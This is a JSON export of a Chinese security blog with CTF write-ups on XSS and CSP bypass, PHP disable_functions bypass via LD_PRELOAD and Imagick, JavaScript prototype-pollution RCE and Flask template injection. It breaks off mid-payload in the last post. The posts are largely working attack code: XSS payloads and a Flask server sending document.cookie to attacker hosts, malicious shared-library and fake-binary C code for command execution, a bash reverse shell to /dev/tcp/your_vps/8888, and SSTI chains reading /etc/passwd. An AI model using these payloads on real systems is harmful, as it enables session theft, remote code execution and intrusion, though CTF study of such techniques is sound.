{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"文章收集","date":"2019-09-04T14:16:42.000Z","updated":"2020-02-27T07:30:34.924Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"2/27 SVG XSS的一个黑魔法 深入理解浏览器解析机制和XSS向量编码 CSP策略及绕过方法 2/26 LD_PRELOAD+putenv bypass 跨域方式及其产生的安全问题 Python3编码问题"},{"title":"关于我","date":"2019-09-04T14:16:42.000Z","updated":"2020-02-21T07:27:16.016Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":""}],"posts":[{"title":"XSS&bypass CSP","slug":"XSS-bypass-CSP","date":"2020-02-27T02:01:25.000Z","updated":"2020-02-27T07:49:23.503Z","comments":true,"path":"2020/02/27/XSS-bypass-CSP/","link":"","permalink":"https://glotozz.github.io/2020/02/27/XSS-bypass-CSP/","excerpt":"从几道题学习XSS以及一些相关绕过姿势","text":"从几道题学习XSS以及一些相关绕过姿势 hgame-Cosmos的聊天室1环境关了，yy一下好了==！ 过滤了所有闭合标签script、iframe等：re.sub(&quot;&lt;\\/?[^&gt;]+&gt;&quot;, &quot;&quot;, message),并转化为大写 用浏览器事件执行js，不闭合右标签时会自动补全 payload1 123&lt;svg/onload=&amp;#119&amp;#105&amp;#110&amp;#100&amp;#111&amp;#119&amp;#46&amp;#111&amp;#112&amp;#101&amp;#110&amp;#40&amp;#39&amp;#104&amp;#116&amp;#116&amp;#112&amp;#58&amp;#47&amp;#47&amp;#118&amp;#112&amp;#115&amp;#45&amp;#105&amp;#112&amp;#39&amp;#43&amp;#100&amp;#111&amp;#99&amp;#117&amp;#109&amp;#101&amp;#110&amp;#116&amp;#46&amp;#99&amp;#111&amp;#111&amp;#107&amp;#105&amp;#101&amp;#41&amp;#59&amp;#47&amp;#47 编码内容window.open(&#39;http://vps-ip&#39;+document.cookie);// payload2 引入外部页面 这个做法仅限chrome 1&lt;link rel=\"import\"href=\"http://vps-ip/\" 但是需要解决跨域问题，使用flask或者SimpleHTTPServer开个服务即可 1234567891011from flask import *app = Flask(__name__)@app.route('/')def hello_world(): response = make_response(\"&lt;script&gt;window.open('http://vps-ip/'+document.cookie)&lt;/script&gt;\") response.headers['Access-Control-Allow-Origin'] = '*' return responseif __name__ == '__main__': app.run(host=\"0.0.0.0\",port=80) 本地测试 hgame-Comcos聊天室2将script替换为空，双写绕过，但是出现报错 Refused to execute inline script because it violates the following ContentSecurity Policy directive: “script-src ‘self’”. Either the ‘unsafe-inline’keyword, a hash (‘sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI=’), or anonce (‘nonce-…’) is required to enable inline execution. 查看CSP策略 1Content-Security-Policy: default-src &apos;self&apos;; script-src &apos;self&apos; 它限制了内联 JS 脚本，并且限制了引入的静态资源文件只能从同域下加载。在实际应用中，遇到这种CSP ⼀般是找该站是否有文件上传点，上传⼀个内容为 alert(/xss/) 的图⽚再引用，也可以同源下有没有可以执行任意 JS 代码的 evil.js 文件。 本题中有⼀个接口 /send，它会返回过滤后的消息内容，我们可以利用 1&lt;scriscriptpt src=&quot;/send?message=alert(1)&quot;&gt;&lt;/scscriptript&gt; RealWorld CTF2019-Mission Invisible给了源码，核心是 123456789101112131415161718&lt;script&gt; function setElement(tag) &#123; tag = tag.substring(0, 1); var ele = document.createElement(tag) var attrs = getCookie(\"attrs\").split(\"&amp;\"); for (var i = 0; i &lt; attrs.length; i++) &#123; var key = attrs[i].split(\"=\")[0]; var value = attrs[i].split(\"=\")[1]; ele.setAttribute(key, value); &#125; document.body.appendChild(ele); &#125; var tag = getUrlParam(\"tag\"); setCookie(\"tag\", tag); setElement(tag);&lt;/script&gt; 可以构造一个标签并为其设置属性 只能使用a、p，但是需要使其自动触发，解决办法如下 1&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt; chrome测试成功 之后常规打cookie即可 RealWorld CTF2019-Hcorme 题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。 两个限制：XSS Auditor、Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;; Hardold师傅的思路—&gt;utf-16编码绕过 因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。 猜测是类似截断的原理，从而bypass XSS Auditor 绕过CSP，是利用JSONP直接把js代码挂载到本地的script 会进行两次资源请求，第二次的资源类型是script 1print(quote((&apos;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&apos;).encode(&apos;utf-16&apos;))) CODEGATE 2020 CSP绕过前面是一个简单的正则绕过，发现存在CSP script-src &#39;none&#39; view.php提交到api.php，格式为name/p1/p2，可以设置header 解决办法：*http状态码置为102时，CSP不会执行 * 颖奇师傅的payload 12345678910#author: 颖奇L'Amore#www.gem-love.comimport base64csp1 = str(base64.b64encode(b'header') ,encoding = \"utf8\")csp2 = str(base64.b64encode(b'HTTP/1.1'),encoding = \"utf8\")csp3 = str(base64.b64encode(b'102'),encoding = \"utf8\")name = str(base64.b64encode(b'body'),encoding = \"utf8\")xss = str(base64.b64encode(b'&lt;script\\n&gt;window.open(\"http://gem-love.com:12345/?\"+document.cookie);&lt;/script\\n&gt;'),encoding = \"utf8\")p3 = \"MQ==\" #p3 is uselessprint('|&#123;&#125;,&#123;&#125;,&#123;&#125;|&#123;&#125;,&#123;&#125;,&#123;&#125;'.format(csp1,csp2,csp3,name,xss,p3)) 0ctf2018-h4xors.club2发现看不懂==！以后再来补 最后给个分享个链接，遇到问题可以查一查：CSP策略及绕过方法 参考链接： https://www.anquanke.com/post/id/186707 https://github.com/vidar-team/Hgame2020_writeup/ https://www.gem-love.com/ctf/1329.html#CSP http://www.wupco.cn/?p=4408","categories":[],"tags":[{"name":"xss","slug":"xss","permalink":"https://glotozz.github.io/tags/xss/"}]},{"title":"从一道题学习bypass disable_func","slug":"从一道题学习bypass-disable-func","date":"2020-02-26T00:07:29.000Z","updated":"2020-02-26T07:56:35.003Z","comments":true,"path":"2020/02/26/从一道题学习bypass-disable-func/","link":"","permalink":"https://glotozz.github.io/2020/02/26/从一道题学习bypass-disable-func/","excerpt":"","text":"ctf和渗透经常会遇到需要bypass disable_func，借下面这道题学习下原理 TCTF wallbreaker easy 很明显，给了我们一个后门，提示需要用Imagick来绕过disable_function，设置了open_basedir，先看看phpinfo() 对比禁用列表 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link =================分割线 加个error_log 1dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,mail,imap_open,imap_mail,putenv,ini_set,apache_setenv,symlink,link,error_log =================分割线 函数对应的利用点 1234567常规绕过: exec、shell_exec、system、passthru、popen、proc_openld_preload绕过: mail、imap_mail、error_log、mb_send_mailpcntl_execimap_openfastcgicomapache mod-cgi 还存在下面5个 12345dlimap_mailputenvini_setapache_setenv 那么就对这个5个一一分析 一、dl()-拓展库绕过 实现方法参考：https://cloud.tencent.com/developer/article/1141142 版本 说明 7.0.0 PHP-FPM 模式下已禁用 dl()。 5.3.9 尽管不推荐，但 PHP-FPM 模式下启用了 dl()。 5.3.0 由于稳定性，dl() 在某些 SAPI 中被禁用。仅仅允许 dl() 的 SAPI 为 CLI 和 Embed。 使用 扩展加载指令 作为替代。 SAPI（Server Application Programming Interface）服务器应用程序编程接口，即PHP与其他应用交互的接口，PHP脚本要执行有很多方式，通过Web服务器，或者直接在命令行下，也可以嵌入在其他程序中。 SAPI提供了一个和外部通信的接口，常见的SAPI有：cgi、fast-cgi、cli、apache模块的DLL、isapi 1Server API FPM/FastCGI 这里未开启dl，遂作罢 二、imap_mail() https://www.exploit-db.com/exploits/35146 适用于PHP &lt; 5.6.2的，遂作罢 三、putenv() putenv()可以设置环境变量 1putenv ( string $setting ) : bool 添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。 主要是和LD_PRELOAD打一套组合拳 LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用 1.制作一个恶意shared libraries2.使用putenv设置LD_PRELOAD为恶意文件路径3.使用某个php函数，触发specific shared library4.成功进行RCE 寻找一个能触发这个二进制文件的php函数 最常见的是mail() 123&lt;?php mail(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;);?&gt; strace一下 1strace -f -e execve php a.php 得到 查看程序可能调用的系统API 1readelf -Ws /usr/sbin/sendmail 有很多函数可以使用，这里可以选择geteuid() hack.c 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123; system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123; if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125; unsetenv(&quot;LD_PRELOAD&quot;); payload();&#125; 这里要生成 shared libraries 12gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so 修改a.php 1234&lt;?php putenv(&quot;LD_PRELOAD=./hack.so&quot;); mail(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;);?&gt; 运行下，发现/tmp下生成了恶意文件，查看 进阶 即使没有安装sendmail也可以RCE，删除sendmail并修改hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;ls&quot;);&#125; 所以当我们最开始将evil shared library load上后，就会触发__attribute__ ((__constructor__)) ，即使后面出现No such file or dicectory 本题中mail()被disable_func限制，提示php-imagick扩展 源码：https://github.com/ImageMagick/ImageMagick 因为知道要调用ffmpeg，github搜索即可 Makefile.nt 搜索mpeg 这里可以WMV为例 a.php 123&lt;?php $img = new Imagick(&apos;sky.wmv&apos;);?&gt; 之后就是和上面类似的查看是否调用 注意的是wmv文件必须存在，否则无法调用ffmpeg hack1.c 123456789#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123; unsetenv(&quot;LD_PRELOAD&quot;); system(&quot;/readflag &gt; /tmp/d4dabdbc73b87e364e29e60c60a92900/flag&quot;);&#125; 12gcc -c -fPIC hack1.c -o skygcc --share sky -o sky.so 本题中，先上传一个sky.so和1.wmv到/tmp/sandbox下 执行 12putenv(&quot;LD_PRELOAD=/tmp/bd24f8b02aaf295daa247018d620ffe4/sky.so&quot;);$img = new Imagick(&apos;/tmp/bd24f8b02aaf295daa247018d620ffe4/1.wmv&apos;); 其他解法： 一、覆盖delegate.xml 因为我们要执行/readflag，那么应该是通过系统命令，那么既然delagate.xml里面能够自定义要执行的命令，我们可以直接写delegate来让imagick当处理某个文件后缀时加载我们的delegate.xml，然后执行我们的command即可。 123&lt;delegatemap&gt; &lt;delegate decode=&quot;ps:alpha&quot; command=&quot;sh -c &amp;quot;/readflag &gt; /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&amp;quot;&quot;/&gt;&lt;/delegatemap&gt; 再执行 12putenv(&apos;MAGICK_CONFIGURE_PATH=/tmp/3accb9900a8be5421641fb31e6861f33&apos;);$img = new Imagick(&apos;/tmp/3accb9900a8be5421641fb31e6861f33/1.ept&apos;); 二、覆盖子进程 比上一种更加深入一层 在delegate.xml定义中在decode ept文件时会调用gs，只要指定path为我们的gs的文件夹路径即可达成劫持的效果。 gs.c 12345678#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main() &#123; unsetenv(&quot;PATH&quot;); const char* cmd = getenv(&quot;CMD&quot;); system(cmd); return 0;&#125; 编译后命名为gs即可，再上传个1.ept 1234putenv(&apos;PATH=/tmp/3accb9900a8be5421641fb31e6861f33&apos;);putenv(&apos;CMD=/readflag &gt; /tmp/3accb9900a8be5421641fb31e6861f33/flag.txt&apos;);chmod(&apos;/tmp/3accb9900a8be5421641fb31e6861f33/gs&apos;,&apos;0777&apos;);$img = new Imagick(&apos;/tmp/3accb9900a8be5421641fb31e6861f33/1.ept&apos;); 三：利用 error_log 函数启动 sendmail 这里我们要用到的就是当 error_log 的第二个参数 message_type 的值为 1 的时候，会调用mail 函数的同一个内置函数(会执行sendmail 命令)的特性。 只需要将第一个mail()例子的hack.c修改成如下即可 1234&lt;?php putenv(&quot;LD_PRELOAD=./hack.so&quot;); error_log(&apos;&apos;,1);?&gt; 四、ini_set() 可以用来绕过open_basedir 1chdir(&apos;img&apos;);ini_set(&apos;open_basedir&apos;,&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);chdir(&apos;..&apos;);ini_set(&apos;open_basedir&apos;,&apos;/&apos;);echo(file_get_contents(&apos;flag&apos;)); 五、apache_setenv apache_setenv — 设置 Apache 子进程环境变量 当设置了某 Apache 环境变量, 相应的 $_SERVER 变量不会改变。 搜了下好像没有直接相关的漏洞==！ 最后放上两个常用的bypass链接 some exploits in php7 bypass disable_functions via LD_PRELOAD 参考链接： https://github.com/l3m0n/Bypass_Disable_functions_Shell https://www.cnblogs.com/tr1ple/p/11279895.html#Bjhbm2Rh https://skysec.top/2019/03/25/2019-0CTF-Web-WriteUp/#%E5%90%8E%E8%AE%B0","categories":[],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://glotozz.github.io/tags/bypass/"}]},{"title":"JavaScript原型链污染","slug":"JavaScript原型链污染","date":"2020-02-25T02:51:11.000Z","updated":"2020-02-27T07:10:00.247Z","comments":true,"path":"2020/02/25/JavaScript原型链污染/","link":"","permalink":"https://glotozz.github.io/2020/02/25/JavaScript原型链污染/","excerpt":"","text":"这次公益赛考到了JavaScript原型链污染，之前看的文章都是纸上谈兵，花点时间来学习记录下。 原型 123function A(name)&#123; this.name = &apos;a&apos;;&#125; 在javascript中,每个对象的都有一个指向他的原型(prototype)的内部链接，这个原型对象又有它自己的原型，直到null为止 在javascript中一切皆对象，因为所有的变量，函数，数组，对象 都始于object的原型即object.prototype。同时，在js中只有类才有prototype属性，而对象却没有，对象有的是__proto__和类的prototype对应。 且二者是等价的 类 数组 上面就是两条完整的原型链，都会指向object，再指向null 再举个原型链搜索的例子 1234567function y()&#123; this.a = &apos;a&apos;; this.b = &apos;b&apos;;&#125;j = new y;y.prototype.c = &apos;c&apos;;console.log(j.c) 这个例子中先new了一个对象j，之后再y中添加c，但是仍然打印出了c 当要使用或输出一个变量时：首先会在本层中搜索相应的变量，如果不存在的话，就会向上搜索，即在自己的父类中搜索，当父类中也没有时，就会向祖父类搜索，直到指向null，如果此时还没有搜索到，就会返回 undefined 再举个原型链污染的例子 123456a = &#123;&apos;b&apos;:1&#125;console.log(a.b)a.__proto__.b = 2console.log(a.b)c = &#123;&#125;console.log(c.b) 修改a的原型即Object的属性b=2，第一次打印a.b根据搜索顺序为b=1，之后new了一个字典对象即Object，因此属性b=2 再举个原型链污染触发的例子 1234567891011121314151617function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125;let o1 = &#123;&#125;;let o2 = &#123;a:1,&quot;__proto__&quot;:&#123;b:2&#125;&#125;;merge(o1,o2);console.log(o1.a,o1.b);o3 = &#123;&#125;;console.log(o3.b); 当key为__proto__即可原型链污染 理论上执行：o1.a = 1 o1.__proto__.b = 2 输出应该是1，2 和 2 执行一下 原因是这里o2 = {a:1,&quot;__proto__&quot;:{b:2}};是给o2的原型赋值属性b=2，相当于 o2 = {a:1,b:2} 解决这个问题需要使__proto__作为键名 o2 = JSON.parse(&#39;{&quot;a&quot;:1,&quot;__proto__&quot;:{&quot;b&quot;:2}}&#39;) Nodejs的RCE 调用child_process模块来执行系统命令 12global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1&quot;&apos;)global.process.mainModule.constructor._load(&apos;child_process&apos;).exec(&apos;bash -c &quot;bash -i &gt;&amp; /dev/tcp/your_vps/8888 0&gt;&amp;1&quot;&apos;) 利用方式一般是object的某个属性为上面的模块并被调用 上面都是原理，下面分析几道题 公益赛Ez epress register需要满足小写不等于admin，之后toUpperCase()存入session，再与ADMIN比较 javascript大小写特性绕过： https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html 成功登录后，继续分析代码，发现 1234567891011121314151617181920const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data = clone(req.body);router.get(&apos;/info&apos;, function (req, res) &#123; res.render(&apos;index&apos;,data=&#123;&apos;user&apos;:res.outputFunctionName&#125;);&#125;) /action污染原型链 /info触发污染的原型链 设置object的outputFunctionName的属性：{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c \\&quot;cat /flag &gt; /app/public/flag\\&quot;&apos;);var __tmp2&quot;&#125;&#125; 失败了，就想调试下js，本地搭建 12#安装模块npm install 发现没有提供端口启动，原文件是利用bin/www里面启动的，为了方便直接添加 1234567//监听端口为3000var server = app.listen(3000, function () &#123; var host = server.address().address; var port = server.address().port; console.log(&apos;Example app listening at http://%s:%s&apos;, host, port);&#125;); node --inspect --debug-brk app.js启动即可利用chrome自带的调试 nodejs调试 未merge()前 merge()后 看下源码才注意到req.session.user.data = clone(req.body); 是整个body。。。修改请求体即可 之前的payload失败是因为没有用json格式发送==！ 访问/info触发原型链，访问/flag下载即可 Codebreaking-thejs server.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require(&apos;fs&apos;)const express = require(&apos;express&apos;)const bodyParser = require(&apos;body-parser&apos;)const lodash = require(&apos;lodash&apos;)const session = require(&apos;express-session&apos;)const randomize = require(&apos;randomatic&apos;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&apos;/static&apos;, express.static(&apos;static&apos;))app.use(session(&#123; name: &apos;thejs.session&apos;, secret: randomize(&apos;aA0&apos;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&apos;ejs&apos;, function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&apos;views&apos;, &apos;./views&apos;)app.set(&apos;view engine&apos;, &apos;ejs&apos;)app.all(&apos;/&apos;, (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == &apos;POST&apos;) &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render(&apos;index&apos;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`)) 使用 lodash 实现了一个简单的 ejs 模版引擎，在请求的时候渲染。 lodash这个模块提供了两个工具lodash.template和lodash.merge，分别可用来进行原型链污染和原型链触发 merge就可以想到之前分析的原型链污染的触发点，因为这是一个express框架，支持Json直接传输数据，并且接收的参数为req.body lodash.template的源码 https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result = attempt(function() &#123; return Function(importsKeys, sourceURL + &apos;return &apos; + source) .apply(undefined, importsValues);&#125;); 追踪sourceURL 1var sourceURL = &apos;sourceURL&apos; in options ? &apos;//# sourceURL=&apos; + options.sourceURL + &apos;\\n&apos; : &apos;&apos;; 其中 option 为我们在模版引擎中，渲染的值。这里读取其中的 sourceURL 属性的值，我们就可以通过这里触发原型污染 payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e =&gt;&#123;return global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;id&apos;);&#125;&quot;&#125;&#125;&#125; 总结简单学习了JavaScript原型链污染的原理以及两道简单的题，下一步学习可以是一些源码更加复杂，或者与其他漏洞结合利用。 参考链接： https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"js","slug":"js","permalink":"https://glotozz.github.io/tags/js/"}]},{"title":"flask模版注入","slug":"flask模版注入","date":"2020-02-24T01:11:15.000Z","updated":"2020-02-27T08:01:06.704Z","comments":true,"path":"2020/02/24/flask模版注入/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flask模版注入/","excerpt":"","text":"漏洞原理参考： https://www.freebuf.com/column/187845.html 漏洞原理用一句话概括：不正确的使用flask中的render_template_string()导致的SSTI，并且模板内容直接受用户控制 这篇文章主要是借flask SSTI复习下python沙盒逃逸，整理下payload，理论上不同机器、不同python版本的payload是不尽相同的。 测试代码 1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) 两种启动方式： flask run --host=0.0.0.0，需要启动的时候设置host，app.run()中更改无效 python app.py，在app.run()中设置host，切换python版本比较方便 确认正常访问 全局变量,比较常见的读取是SECRET_KEY 文件读取/命令执行无论是实现文件读取还是命令执行，需要利用对象的继承，先找到父类&lt;type &#39;object&#39;&gt;，再寻找子类，最后找到我们需要用到的相应模块 几个要用到的魔术方法 12345678__class__ 返回类型所属的对象__mro__ 返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__ 返回该对象所继承的基类// __base__和__mro__都是用来寻找基类的__subclasses__ 每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__ 类的初始化方法__globals__ 对包含函数全局变量的字典的引用 先测试Python 2.7.17 需要先选取一个类，几种常见的类&#39;&#39;、request、[]、() 1、获取类对象 123456789&gt;&gt;&gt; &apos;&apos;.__class__&lt;type &apos;str&apos;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &apos;module&apos;&gt;&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; 2、寻找基类object 12345678910111213&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &apos;module&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &apos;list&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &apos;tuple&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt; object在最底层故在列表中的最后，通过__mro__[-1]可以获取到 3、寻找可用的引用 12&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;urlparse.ResultMixin&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;time.struct_time&apos;&gt;] 4、文件读取 Payload 1 发现40的地方存在 &lt;type &#39;file&#39;&gt; 12&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()request.__class__.__mro__[1].__subclasses__()[40](&apos;/etc/passwd&apos;).read() 查下标 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in 